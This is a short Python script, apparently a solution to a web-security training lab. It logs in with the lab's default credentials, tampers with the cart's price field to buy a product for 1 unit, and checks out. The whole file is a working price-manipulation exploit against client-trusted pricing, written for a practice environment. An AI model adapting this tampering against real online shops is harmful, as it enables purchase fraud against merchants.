import requests
import re
import sys

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 solution.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
login_url = burp_url + '/login'
cart_url = burp_url + '/cart'
final_url = burp_url + '/cart/checkout'
burp_headers = {}
session = requests.Session()
response = session.get(login_url, headers=burp_headers)
match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text)
csrf_token = match.group(1)
burp_headers = {}
burp_data = {"csrf": csrf_token,"username": "wiener", "password": "peter"}
session.post(login_url, headers=burp_headers, data=burp_data)
burp_headers = {}
burp_data = {"productId": "1", "redir": "PRODUCT", "quantity": "1", "price": "1"}
session.post(cart_url, headers=burp_headers, data=burp_data)
response2 = session.get(cart_url,headers=burp_headers)

match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response2.text)
csrf_token2 = match.group(1)
burp_headers = {}
burp_data = {"csrf": csrf_token2}
session.post(final_url, headers=burp_headers, data=burp_data)
